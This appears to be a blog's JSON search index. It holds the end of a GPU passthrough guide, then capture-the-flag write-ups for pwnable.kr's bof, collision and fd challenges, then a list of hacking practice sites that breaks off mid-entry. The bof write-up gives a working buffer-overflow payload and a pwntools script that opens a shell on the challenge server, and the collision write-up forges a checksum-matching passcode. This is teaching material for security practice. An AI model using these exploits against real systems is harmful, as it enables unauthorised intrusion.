\u0026lt;console type=\u0026#39;pty\u0026#39;\u0026gt; 120 \u0026lt;target type=\u0026#39;serial\u0026#39; port=\u0026#39;0\u0026#39;/\u0026gt; 121 \u0026lt;/console\u0026gt; 122 \u0026lt;input type=\u0026#39;tablet\u0026#39; bus=\u0026#39;usb\u0026#39;\u0026gt; 123 \u0026lt;address type=\u0026#39;usb\u0026#39; bus=\u0026#39;0\u0026#39; port=\u0026#39;2\u0026#39;/\u0026gt; 124 \u0026lt;/input\u0026gt; 125 \u0026lt;input type=\u0026#39;mouse\u0026#39; bus=\u0026#39;ps2\u0026#39;/\u0026gt; 126 \u0026lt;input type=\u0026#39;keyboard\u0026#39; bus=\u0026#39;ps2\u0026#39;/\u0026gt; 127 \u0026lt;sound model=\u0026#39;ich9\u0026#39;\u0026gt; 128 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x00\u0026#39; slot=\u0026#39;0x1b\u0026#39; 129function=\u0026#39;0x0\u0026#39;/\u0026gt; 130 \u0026lt;/sound\u0026gt; 131 \u0026lt;hostdev mode=\u0026#39;subsystem\u0026#39; type=\u0026#39;pci\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; 132 \u0026lt;source\u0026gt; 133 \u0026lt;address domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x1e\u0026#39; slot=\u0026#39;0x00\u0026#39; function=\u0026#39;0x0\u0026#39;/\u0026gt; 134 \u0026lt;/source\u0026gt; 135 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x03\u0026#39; slot=\u0026#39;0x00\u0026#39; 136function=\u0026#39;0x0\u0026#39;/\u0026gt; 137 \u0026lt;/hostdev\u0026gt; 138 \u0026lt;hostdev mode=\u0026#39;subsystem\u0026#39; type=\u0026#39;pci\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; 139 \u0026lt;source\u0026gt; 140 \u0026lt;address domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x1e\u0026#39; slot=\u0026#39;0x00\u0026#39; function=\u0026#39;0x1\u0026#39;/\u0026gt; 141 \u0026lt;/source\u0026gt; 142 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x04\u0026#39; slot=\u0026#39;0x00\u0026#39; 143function=\u0026#39;0x0\u0026#39;/\u0026gt; 144 \u0026lt;/hostdev\u0026gt; 145 \u0026lt;hostdev mode=\u0026#39;subsystem\u0026#39; type=\u0026#39;usb\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; 146 \u0026lt;source\u0026gt; 147 \u0026lt;vendor id=\u0026#39;0x046d\u0026#39;/\u0026gt; 148 \u0026lt;product id=\u0026#39;0xc07e\u0026#39;/\u0026gt; 149 \u0026lt;/source\u0026gt; 150 \u0026lt;address type=\u0026#39;usb\u0026#39; bus=\u0026#39;0\u0026#39; port=\u0026#39;5\u0026#39;/\u0026gt; 151 \u0026lt;/hostdev\u0026gt; 152 \u0026lt;redirdev bus=\u0026#39;usb\u0026#39; type=\u0026#39;spicevmc\u0026#39;\u0026gt; 153 \u0026lt;address type=\u0026#39;usb\u0026#39; bus=\u0026#39;0\u0026#39; port=\u0026#39;3\u0026#39;/\u0026gt; 154 \u0026lt;/redirdev\u0026gt; 155 \u0026lt;redirdev bus=\u0026#39;usb\u0026#39; type=\u0026#39;spicevmc\u0026#39;\u0026gt; 156\u0026lt;address type=\u0026#39;usb\u0026#39; bus=\u0026#39;0\u0026#39; port=\u0026#39;4\u0026#39;/\u0026gt; 157 \u0026lt;/redirdev\u0026gt; 158 \u0026lt;memballoon model=\u0026#39;virtio\u0026#39;\u0026gt; 159 \u0026lt;address type=\u0026#39;pci\u0026#39; domain=\u0026#39;0x0000\u0026#39; bus=\u0026#39;0x05\u0026#39; slot=\u0026#39;0x00\u0026#39; 160function=\u0026#39;0x0\u0026#39;/\u0026gt; 161 \u0026lt;/memballoon\u0026gt; 162 \u0026lt;/devices\u0026gt; 163\u0026lt;/domain\u0026gt; And thats it! You are done!\nSources The guide that I mainly followed is this:\n (http://mathiashueber.com/windows-virtual-machine-gpu-passthrough-ubuntu/)  A major part pf my guide has been taken from this guide, but as you know, all systems are not the same, and so to get my setupo working , I had to follow somw other resources as well. You must watch the level1tech videos on this topic. They also got an article on this. The resources I used are:\n (https://level1techs.com/article/ryzen-gpu-passthrough-setup-guide-fedora-26-windows-gaming-linux) (https://heiko-sieger.info/running-windows-10-on-linux-using-kvm-with-vga-passthrough/) (https://scottlinux.com/2016/08/28/gpu-passthrough-with-kvm-and-debian-linux/) (https://www.reddit.com/r/VFIO/comments/af71pf/kernel_driver_in_use_amdgpu_instead_of_vfiopci/ee0emkf/)  Videos to watch: \n","id":14,"section":"posts","summary":"Preamble This guide shows how to passthrough a gpu to a vm running on QEMU/KVM on linux for improved graphical performance. In my case, I did it to run windows and play games while I can still work on my linux machine. Dual booting is not a good solution in this case as rebooting into windows just for the purpose of gaming is a pain. Passing through my gpu, I can switch between games and work with muxh ease.","tags":["qemu","kvm","virtualization","passthrough"],"title":"Ryzen Gpu passthrough guide on debian","uri":"https://fmash16.github.io/2020/03/gpu_passthrough/","year":"2020"},{"content":" Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?\nDownload : http://pwnable.kr/bin/bof Download : http://pwnable.kr/bin/bof.c\nRunning at : nc pwnable.kr 9000\n Solution: We get the files and run the executable bof\n1$./bof 2overflow me : 3AAAAAAAAAAAAAAAAAAAAAAAAAAA 4Nah.. 5$./bof 6overflow me : 7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 8Nah.. 9*** stack smashing detected ***: ./bof terminated 10Aborted The program asks for an input and on bufferoverflow, it detects stack smashing. We have a look at the source code bof.c\n1#include \u0026lt;stdio.h\u0026gt;2#include \u0026lt;string.h\u0026gt;3#include \u0026lt;stdlib.h\u0026gt;4void func(int key){ 5 char overflowme[32]; 6 printf(\u0026#34;overflow me : \u0026#34;); 7 gets(overflowme); // smash me! 8 if(key == 0xcafebabe){ 9 system(\u0026#34;/bin/sh\u0026#34;); 10 } 11 else{ 12 printf(\u0026#34;Nah..\\n\u0026#34;); 13 } 14} 15int main(int argc, char* argv[]){ 16 func(0xdeadbeef); 17 return 0; 18} We are interested in the function func. It is called with the argument 0xdeadbeef. It takes the user input using the vulnerable gets function and writes the input to the variable overflowme which we are to smash as the code says. If the argument value key is equal to 0xcafebabe, we get a shell.\nSo, we have to overwrite the passed variable key to the function func with 0xcafebabe. We use gdb to find the location of the variable in memory and overwrite using using basic buffer overflow.\nInitially, we run the program with a few \u0026ldquo;A\u0026quot;s stored in a file payload in the same directory\n$python -c \u0026quot;print('A'*32)\u0026quot; \u0026gt; payload Now, we open the program in gdb and set breakpoint at function func and run with input from the file payload\n1(gdb) disas func 2Dump of assembler code for function func: 3 0x0000062c \u0026lt;+0\u0026gt;: push ebp 4 0x0000062d \u0026lt;+1\u0026gt;: mov ebp,esp 5 0x0000062f \u0026lt;+3\u0026gt;: sub esp,0x48 6 0x00000632 \u0026lt;+6\u0026gt;: mov eax,gs:0x14 7 0x00000638 \u0026lt;+12\u0026gt;: mov DWORD PTR [ebp-0xc],eax 8 0x0000063b \u0026lt;+15\u0026gt;: xor eax,eax 9 0x0000063d \u0026lt;+17\u0026gt;: mov DWORD PTR [esp],0x78c 10 0x00000644 \u0026lt;+24\u0026gt;: call 0x645 \u0026lt;func+25\u0026gt; 11 0x00000649 \u0026lt;+29\u0026gt;: lea eax,[ebp-0x2c] 12 0x0000064c \u0026lt;+32\u0026gt;: mov DWORD PTR [esp],eax 13 0x0000064f \u0026lt;+35\u0026gt;: call 0x650 \u0026lt;func+36\u0026gt; 14 0x00000654 \u0026lt;+40\u0026gt;: cmp DWORD PTR [ebp+0x8],0xcafebabe 15 0x0000065b \u0026lt;+47\u0026gt;: jne 0x66b \u0026lt;func+63\u0026gt; 16 0x0000065d \u0026lt;+49\u0026gt;: mov DWORD PTR [esp],0x79b 17 0x00000664 \u0026lt;+56\u0026gt;: call 0x665 \u0026lt;func+57\u0026gt; 18 0x00000669 \u0026lt;+61\u0026gt;: jmp 0x677 \u0026lt;func+75\u0026gt; 19 0x0000066b \u0026lt;+63\u0026gt;: mov DWORD PTR [esp],0x7a3 20 0x00000672 \u0026lt;+70\u0026gt;: call 0x673 \u0026lt;func+71\u0026gt; 21 0x00000677 \u0026lt;+75\u0026gt;: mov eax,DWORD PTR [ebp-0xc] 22 0x0000067a \u0026lt;+78\u0026gt;: xor eax,DWORD PTR gs:0x14 23 0x00000681 \u0026lt;+85\u0026gt;: je 0x688 \u0026lt;func+92\u0026gt; 24 0x00000683 \u0026lt;+87\u0026gt;: call 0x684 \u0026lt;func+88\u0026gt; 25 0x00000688 \u0026lt;+92\u0026gt;: leave 26 0x00000689 \u0026lt;+93\u0026gt;: ret 27End of assembler dump. 28(gdb) b func 29Breakpoint 1 at 0x632 30(gdb) r \u0026lt; payload 31Starting program: /home/fmash/ctf/pwnable/toddler\u0026#39;s_bottle/bof/bof \u0026lt; payload 32 33Breakpoint 1, 0x56555632 in func () We set a breakpoint at the line 40 where our input is compared with the required value 0xcafebabe and examine the stack after continuing.\n1(gdb) disas func 2Dump of assembler code for function func: 3 0x5655562c \u0026lt;+0\u0026gt;: push ebp 4 0x5655562d \u0026lt;+1\u0026gt;: mov ebp,esp 5 0x5655562f \u0026lt;+3\u0026gt;: sub esp,0x48 6=\u0026gt; 0x56555632 \u0026lt;+6\u0026gt;: mov eax,gs:0x14 7 0x56555638 \u0026lt;+12\u0026gt;: mov DWORD PTR [ebp-0xc],eax 8 0x5655563b \u0026lt;+15\u0026gt;: xor eax,eax 9 0x5655563d \u0026lt;+17\u0026gt;: mov DWORD PTR [esp],0x5655578c 10 0x56555644 \u0026lt;+24\u0026gt;: call 0xf7e58890 \u0026lt;puts\u0026gt; 11 0x56555649 \u0026lt;+29\u0026gt;: lea eax,[ebp-0x2c] 12 0x5655564c \u0026lt;+32\u0026gt;: mov DWORD PTR [esp],eax 13 0x5655564f \u0026lt;+35\u0026gt;: call 0xf7e57fc0 \u0026lt;gets\u0026gt; 14 0x56555654 \u0026lt;+40\u0026gt;: cmp DWORD PTR [ebp+0x8],0xcafebabe 15 0x5655565b \u0026lt;+47\u0026gt;: jne 0x5655566b \u0026lt;func+63\u0026gt; 16 0x5655565d \u0026lt;+49\u0026gt;: mov DWORD PTR [esp],0x5655579b 17 0x56555664 \u0026lt;+56\u0026gt;: call 0xf7e33850 \u0026lt;system\u0026gt; 18 0x56555669 \u0026lt;+61\u0026gt;: jmp 0x56555677 \u0026lt;func+75\u0026gt; 19 0x5655566b \u0026lt;+63\u0026gt;: mov DWORD PTR [esp],0x565557a3 20 0x56555672 \u0026lt;+70\u0026gt;: call 0xf7e58890 \u0026lt;puts\u0026gt; 21 0x56555677 \u0026lt;+75\u0026gt;: mov eax,DWORD PTR [ebp-0xc] 22 0x5655567a \u0026lt;+78\u0026gt;: xor eax,DWORD PTR gs:0x14 23 0x56555681 \u0026lt;+85\u0026gt;: je 0x56555688 \u0026lt;func+92\u0026gt; 24 0x56555683 \u0026lt;+87\u0026gt;: call 0xf7ef16c0 \u0026lt;__stack_chk_fail\u0026gt; 25 0x56555688 \u0026lt;+92\u0026gt;: leave 26 0x56555689 \u0026lt;+93\u0026gt;: ret 27End of assembler dump. 28(gdb) b *0x56555654 29Breakpoint 2 at 0x56555654 30(gdb) c 31Continuing. 32overflow me : 33 34Breakpoint 2, 0x56555654 in func () 35(gdb) x/50x $esp 360xffffd0e0: 0xffffd0fc 0xffffd184 0xf7fad000 0x0000000d 370xffffd0f0: 0xffffffff 0xf7fad000 0xf7e05e18 0x41414141 \u0026lt;== 380xffffd100: 0x41414141 0x41414141 0x41414141 0x41414141 390xffffd110: 0x41414141 0x41414141 0x41414141 0x14404000 400xffffd120: 0x00000001 0xf7fad000 0xffffd148 0x5655569f 410xffffd130: 0xdeadbeef 0x56555250 0x565556b9 0x00000000 420xffffd140: 0x00000001 0xf7fad000 0x00000000 0xf7e11286 430xffffd150: 0x00000001 0xffffd1e4 0xffffd1ec 0x00000000 440xffffd160: 0x00000000 0x00000000 0xf7fad000 0xf7ffdc0c 450xffffd170: 0xf7ffd000 0x00000000 0x00000001 0xf7fad000 460xffffd180: 0x00000000 0x0826aef6 0x35a082e6 0x00000000 470xffffd190: 0x00000000 0x00000000 0x00000001 0x56555530 480xffffd1a0: 0x00000000 0xf7fee5f0 Examining the stack, we observe that our input is stored starting from the address 0xffffd0fc and the function argument 0xdeadbeef is stored at address 0xffffd130, which we need to override with 0xcafebabe\nWe need to figure out the length of our padding in order to overwrite the value at address 0xffffd130. We can find this easily in python , subtractin the addresses\n1\u0026gt;\u0026gt;\u0026gt; 0xffffd130-0xffffd0fc 252 So, we need a padding of size 52, and then we insert the required value in reverse order to overwrite the argument.\nNow, we create our new payload and run the program again\n1$python -c \u0026#34;print(\u0026#39;A\u0026#39;*52 + \u0026#39;\\xbe\\xba\\xfe\\xca\u0026#39;)\u0026#34; \u0026gt; payload 1(gdb) x/50x $esp 20xffffd0e0: 0xffffd0fc 0xffffd184 0xf7fad000 0x0000000d 30xffffd0f0: 0xffffffff 0xf7fad000 0xf7e05e18 0x41414141 40xffffd100: 0x41414141 0x41414141 0x41414141 0x41414141 50xffffd110: 0x41414141 0x41414141 0x41414141 0x41414141 60xffffd120: 0x41414141 0x41414141 0x41414141 0x41414141 70xffffd130: 0xcafebabe 0x56555200 0x565556b9 0x00000000 80xffffd140: 0x00000001 0xf7fad000 0x00000000 0xf7e11286 90xffffd150: 0x00000001 0xffffd1e4 0xffffd1ec 0x00000000 100xffffd160: 0x00000000 0x00000000 0xf7fad000 0xf7ffdc0c 110xffffd170: 0xf7ffd000 0x00000000 0x00000001 0xf7fad000 120xffffd180: 0x00000000 0xf1272840 0xcca10450 0x00000000 130xffffd190: 0x00000000 0x00000000 0x00000001 0x56555530 140xffffd1a0: 0x00000000 0xf7fee5f0 Examinng the stack, we see that we have correctly overwritten the value at 0xffffd130 with our desired value 0xcafebabe.\nNow we supply our payload to the program running on the server\n1$(cat payload; cat) | nc pwnable.kr 9000 2whoami 3bof 4ls 5bof 6bof.c 7flag 8log 9log2 10super.pl 11cat flag 12daddy, I just pwned a buFFer :) We see that we got a shell on the server. We use cat to hold the shell. We can now easily cat the flag!\nWe can use a simple python script to get the flag for us:\n1#! /usr/bin/python2 2 3# exploit.py 4 5from pwn import * 6 7payload = \u0026#39;A\u0026#39;*52 + \u0026#39;\\xbe\\xba\\xfe\\xca\u0026#39; 8shell = remote(\u0026#39;pwnable.kr\u0026#39;, 9000) 9shell.send(payload) 10shell.interactive() 1$./exploit.py 2[+] Opening connection to pwnable.kr on port 9000: Done 3[*] Switching to interactive mode 4$ ls 5$ ls 6bof 7bof.c 8flag 9log 10log2 11super.pl 12$ cat flag 13daddy, I just pwned a buFFer :) FLAG: daddy, I just pwned a buFFer :)\n","id":15,"section":"writeups","summary":"Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?\nDownload : http://pwnable.kr/bin/bof Download : http://pwnable.kr/bin/bof.c\nRunning at : nc pwnable.kr 9000\n Solution: We get the files and run the executable bof\n1$./bof 2overflow me : 3AAAAAAAAAAAAAAAAAAAAAAAAAAA 4Nah.. 5$./bof 6overflow me : 7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 8Nah.. 9*** stack smashing detected ***: ./bof terminated 10Aborted The program asks for an input and on bufferoverflow, it detects stack smashing.","tags":null,"title":"pwnable.kr - bof writeup","uri":"https://fmash16.github.io/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-bof-writeup/","year":"2020"},{"content":" Daddy told me about cool MD5 hash collision today. I wanna do something like that too!\nssh col@pwnable.kr -p2222 (pw:guest)\n Solution: We ssh with the given password and list the files in the directory\n$ssh col@pwnable.kr -p2222 col@pwnable.kr's password: ____ __ __ ____ ____ ____ _ ___ __ _ ____ | \\| |__| || \\ / || \\ | | / _] | |/ ]| \\ | o ) | | || _ || o || o )| | / [_ | ' / | D ) | _/| | | || | || || || |___ | _] | \\ | / | | | ` ' || | || _ || O || || [_ __ | \\| \\ | | \\ / | | || | || || || || || . || . \\ |__| \\_/\\_/ |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_| - Site admin : daehee87@gatech.edu - IRC : irc.netgarage.org:6667 / #pwnable.kr - Simply type \u0026quot;irssi\u0026quot; command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have mail. Last login: Wed Feb 19 05:52:28 2020 from 84.178.156.63 col@pwnable:~$ ls -la total 36 drwxr-x--- 5 root col 4096 Oct 23 2016 . drwxr-xr-x 116 root root 4096 Nov 12 21:34 .. d--------- 2 root root 4096 Jun 12 2014 .bash_history -r-sr-x--- 1 col_pwn col 7341 Jun 11 2014 col -rw-r--r-- 1 root root 555 Jun 12 2014 col.c -r--r----- 1 col_pwn col_pwn 52 Jun 11 2014 flag dr-xr-xr-x 2 root root 4096 Aug 20 2014 .irssi drwxr-xr-x 2 root root 4096 Oct 23 2016 .pwntools-cache We test the executable col which requires a passcode of length 20 bytes and has the setuid bit set.\ncol@pwnable:~$ ./col usage : ./col [passcode] col@pwnable:~$ ./col 1234 passcode length should be 20 bytes We analyze the given source col.c\n1#include \u0026lt;stdio.h\u0026gt;2#include \u0026lt;string.h\u0026gt;3unsigned long hashcode = 0x21DD09EC; 4unsigned long check_password(const char* p){ 5 int* ip = (int*)p; 6 int i; 7 int res=0; 8 for(i=0; i\u0026lt;5; i++){ 9 res += ip[i]; 10 } 11 return res; 12} 13 14int main(int argc, char* argv[]){ 15 if(argc\u0026lt;2){ 16 printf(\u0026#34;usage : %s [passcode]\\n\u0026#34;, argv[0]); 17 return 0; 18 } 19 if(strlen(argv[1]) != 20){ 20 printf(\u0026#34;passcode length should be 20 bytes\\n\u0026#34;); 21 return 0; 22 } 23 24 if(hashcode == check_password( argv[1] )){ 25 system(\u0026#34;/bin/cat flag\u0026#34;); 26 return 0; 27 } 28 else 29 printf(\u0026#34;wrong passcode.\\n\u0026#34;); 30 return 0; 31} We see that the program takes a 20 byte long string as a passcode and then checks is using the function checkpass and if the function return value matches the stored hashcode 0x21DD09EC, it prints out the flag for us.\nWe are interested in the function check_password. If we can get the function to return the int value of hashcode, we will get the flag.\nWe analyze the function now. Firstly, we see that the function converts our supplied passcode to a int value. Then it runs a loop 5 times which sums up the 5 elements of the array ip which stored the int value of our string The loop runs 5 times because we suppllied a passcode of length 20. Each char takes 1 byte and each integer takes 4 byte. so on conversion of a 20 byte string to int, it takes 20/4=5 bytes. So, we have to supply a string such that the converted integers have a sum of 0x21DD09EC. We can find this using python.\n1\u0026gt;\u0026gt;\u0026gt; 0x21DD09EC 2568134124 So, 568134124 this is the decimal value we are working with. We divide into 5 equal parts so that the sum results in the given hashcode\n1\u0026gt;\u0026gt;\u0026gt; 568134124/5 2113626824 3\u0026gt;\u0026gt;\u0026gt; 568134124%5 44 We get a remainder 4. So, the five integers will be 113626824*4 and 113626828. Now we convert them to hex.\n1\u0026gt;\u0026gt;\u0026gt; hex(113626824) 2\u0026#39;0x6c5cec8\u0026#39; 3\u0026gt;\u0026gt;\u0026gt; hex(113626828) 4\u0026#39;0x6c5cecc\u0026#39; Now, we run the program with the constructed passcode:\ncol@pwnable:~$ ./col `python -c \u0026quot;print('\\xc8\\xce\\xc5\\x06'*4 + '\\xcc\\xce\\xc5\\x06')\u0026quot;` daddy! I just managed to create a hash collision :) ps: we inverted the order of the bytes because of little endianness.\nThere we have the flag!\nFLAG: daddy! I just managed to create a hash collision :)\n","id":16,"section":"writeups","summary":"Daddy told me about cool MD5 hash collision today. I wanna do something like that too!\nssh col@pwnable.kr -p2222 (pw:guest)\n Solution: We ssh with the given password and list the files in the directory\n$ssh col@pwnable.kr -p2222 col@pwnable.kr's password: ____ __ __ ____ ____ ____ _ ___ __ _ ____ | \\| |__| || \\ / || \\ | | / _] | |/ ]| \\ | o ) | | || _ || o || o )| | / [_ | ' / | D ) | _/| | | || | || || || |___ | _] | \\ | / | | | ` ' || | || _ || O || || [_ __ | \\| \\ | | \\ / | | || | || || || || || .","tags":null,"title":"pwnable.kr - collision writeup","uri":"https://fmash16.github.io/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-collision-writeup/","year":"2020"},{"content":" Mommy! what is a file descriptor in Linux?\n try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw  ssh fd@pwnable.kr -p2222 (pw:guest)\n Solution: This is the easiest of all the problems here. We login with via ssh with the given credentials and find 3 files.\n$ssh fd@pwnable.kr -p2222 fd@pwnable.kr's password: ____ __ __ ____ ____ ____ _ ___ __ _ ____ | \\| |__| || \\ / || \\ | | / _] | |/ ]| \\ | o ) | | || _ || o || o )| | / [_ | ' / | D ) | _/| | | || | || || || |___ | _] | \\ | / | | | ` ' || | || _ || O || || [_ __ | \\| \\ | | \\ / | | || | || || || || || . || . \\ |__| \\_/\\_/ |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_| - Site admin : daehee87@gatech.edu - IRC : irc.netgarage.org:6667 / #pwnable.kr - Simply type \u0026quot;irssi\u0026quot; command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have new mail. Last login: Wed Feb 19 02:22:48 2020 from 116.41.6.25 fd@pwnable:~$ ls -l total 16 -r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd -rw-r--r-- 1 root root 418 Jun 11 2014 fd.c -r--r----- 1 fd_pwn root 50 Jun 11 2014 flag We run the executable fd which takes a number as an argument.\nfd@pwnable:~$ ./fd pass argv[1] a number fd@pwnable:~$ ./fd 1 learn about Linux file IO We are told to learn about file IO in linux. Read this to learn about linux file IO and descriptors.\nWe analyze the code fd.c:\n1#include \u0026lt;stdio.h\u0026gt;2#include \u0026lt;stdlib.h\u0026gt;3#include \u0026lt;string.h\u0026gt;4char buf[32]; 5int main(int argc, char* argv[], char* envp[]){ 6 if(argc\u0026lt;2){ 7 printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); 8 return 0; 9 } 10 int fd = atoi( argv[1] ) - 0x1234; 11 int len = 0; 12 len = read(fd, buf, 32); 13 if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ 14 printf(\u0026#34;good job :)\\n\u0026#34;); 15 system(\u0026#34;/bin/cat flag\u0026#34;); 16 exit(0); 17 } 18 printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); 19 return 0; 20 21} Here, we see that it uses the read function to read a string from buf and compares it with the string \u0026ldquo;LETMEWIN\u0026rdquo;. On success, it calls the system to execute the command /bin/cat flag which prints out the flag to which we do not have write permission, but the program has the setuid bit set.\nSo, in order to store our input to buf, we need to set the value of fd, which is the file descriptor to 0, which is the stdin stream. The arg supplied is converted from ascii to int and 0x1234 is subtracted from it. So, the the hex value of arg should also be 0x1234 for fd=0. We find the decimal/ascii value of 0x1234 using python\n1\u0026gt;\u0026gt;\u0026gt; int(\u0026#34;1234\u0026#34;, 16) 24660 Now we run fd again with the value 4660 as arg\nfd@pwnable:~$ ./fd 4660 LETMEWIN good job :) mommy! I think I know what a file descriptor is!! We see that the program waits for user input, and we input the compared string \u0026ldquo;LETMEWIN\u0026rdquo; to get the flag.\nFLAG: mommy! I think I know what a file descriptor is!!\n","id":17,"section":"writeups","summary":"Mommy! what is a file descriptor in Linux?\n try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw  ssh fd@pwnable.kr -p2222 (pw:guest)\n Solution: This is the easiest of all the problems here. We login with via ssh with the given credentials and find 3 files.\n$ssh fd@pwnable.kr -p2222 fd@pwnable.kr's password: ____ __ __ ____ ____ ____ _ ___ __ _ ____ | \\| |__| || \\ / || \\ | | / _] | |/ ]| \\ | o ) | | || _ || o || o )| | / [_ | ' / | D ) | _/| | | || | || || || |___ | _] | \\ | / | | | ` ' || | || _ || O || || [_ __ | \\| \\ | | \\ / | | || | || || || || || .","tags":["pwn","easy","file descriptor"],"title":"pwnable.kr - fd writeup","uri":"https://fmash16.github.io/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-fd-writeup/","year":"2020"},{"content":"Have you ever wondered where to start hacking, acquire more hacking knowledge and even train, test and improve your hacking skills? Here is a compilation, collection, list, directory of the best sites that will help you. The sites listed below will help you understand and practice every aspect of the secure (or rather insecure) side of software, networks (networking), servers and every single element that may be exposed in the(our) binary world.\nPlease note that this is a mere compilation, all credits go to their respective authors. Creating such challenges requires and involves a lot of time, knowledge and creativity. Respect their work.\nWebsite list:   Pwnable: Pwnable is a classic, one of all-time favorites. pwnable.kr is a non-commercial wargame site which provides various pwn challenges regarding system exploitation. The main purpose of pwnable.kr is ‘fun’. While playing pwnable.kr, you could learn/improve system hacking skills but that shouldn’t be your only purpose. The only thing you must do is click “play” on the upper left zone, choose a game and Pwn it. They provide a scoring system, the harder the challenge is, the more score you win.\n  24/7 CTF: Join now to continuously test your skills across web, crypto, networking, reversing and exploitation vulnerabilities and challenges.\n  CTFTIME: One of the biggest Capture The Flag (CTF) archives. They classify the challenges by year and profide useful information and statistics. For example, each competition participating teams, the winning team, their members, their write-ups, etc…\n  Over The Wire: Again one of all-time favorites. The wargames offered by the OverTheWire community can help you to learn and practice security concepts in the form of fun-filled games. To find out more about a certain wargame, just visit its page linked from the menu on the left. They have a suggested order to play the games in in their “About”.\n  W3 Challenges: W3Challs is a penetration testing training platform, which offers various computer challenges, in categories related to security: Hacking, Cracking, Wargame, Forensic, Cryptography and Programming. The purpose of this site is to offer realistic challenges, without simulation, and without guessing!\n  Pwnable.tw: Pwnable.tw is a wargame site for hackers to test and expand their binary exploiting skills. Just as the .kr version (I actually don’t know if they’re related) the only thing you must do is click “challenges” con the upper left webpage tabs. They provide a scoring system, the harder the challenge is, the more score you earn. They also provide write-ups.\n  Challenges.re: Website created by Dennis Yurichev, the writer of the awesome book “Reverse Engineering for Beginners” (https://beginners.re/).\n  Reversing Hero: ReversingHero is a 15-challenges computer program, designed to teach you Reverse Engineering. It begins from the real basics, and continues into more advanced topics.\n  ROP Emporium: Learn return-oriented programming through a series of challenges designed to teach ROP techniques in isolation, with minimal reverse-engineering and bug-hunting.\n  picoCTF: picoCTF is a computer security game targeted at middle and high school students. The game consists of a series of challenges centered around a unique storyline where participants must reverse engineer, break, hack, decrypt, or do whatever it takes to solve the challenge. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.\n  CTF365: CTF365 is a real life cyber range where users build their own servers and defend them while attacking other servers. It’s what would happen in real life when your server or computer networks are under attack by hackers.\n  Hack The Box: Hack The Box is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with other members of similar interests. It contains several challenges that are constantly updated. Some of them simulating real world scenarios and some of them leaning more towards a CTF style of challenge.\n  Vulnhub: Their goal is simple: “To provide materials that allows anyone to gain practical ‘hands-on’ experience in digital security, computer software \u0026amp; network administration”\n  Root Me: The fast, easy, and affordable way to train your hacking skills. Root-me has a wide variety of challenges. CTFs, scripts, system, cracking, cryptanalysis, forensic, network, programming, realist, steganography, web-client, web-server.\n  Exploit Education: (Formerly Exploit-exercises) Exploit education provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.\n  Hack This: Want to learn about hacking and network security? Discover how hacks, dumps and defacements are performed and secure your website against hackers with HackThis.\n  []Hack This Site(https://www.hackthissite.org/): Hack This Site is a free, safe and legal training ground for hackers to test and expand their hacking skills. More than just another hacker wargames site, we are a living, breathing community with many active projects in development, with a vast selection of hacking articles and a huge forum where users can discuss hacking, network security, and just about everything. Tune in to the hacker underground and get involved with the project.\n  Try2Hack: (You will probably get a browser warning about the page not being secure not https) This site provides several security-oriented challenges for your entertainment. It is actually one of the oldest challenge sites still around. The challenges are diverse and get progressively harder.\n  Hacking Lab: Hacking-Lab is an online ethical hacking, computer network and security challenge platform, dedicated to finding and educating cyber security talents. Hacking-Labs’ goal is to raise awareness towards increased education and ethics in information security through a series of cyber competitions that encompass forensics, cryptography, reverse-engineering, ethical hacking and defense. One key initiative for Hacking-Lab is to foster an environment that creates cyber protection through education.\n  IO wargame:\n  Smash The Stack - Wargaming Networking: The Smash the Stack Wargaming Network hosts several Wargames.\n  CTF Katsudon: Incredibly complete CTF collection and validation site. Baby, easy, medium easy, mediuam mediuam, mediuam hard and hard challenges awaits!\n  Linux privilege escalation: A Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabilities that allow a user to escalate to root on the box. This has been designed to help understand how certain built-in applications and services if misconfigured, may be abused by an attacker.\n  MicroCTFs: Small CTF challenges running on Docker\n  Reversing.kr: This site tests your ability to Cracking \u0026amp; Reverse Code Engineering. Now Challenge a problem for each environment. (Windows, Linux, .Net, Flash, Java, Python, Mobile..)\n  Microcorruption: Web-based CTF focused in teaching assembly language and low-level debugging.\n  Tuoni labs: 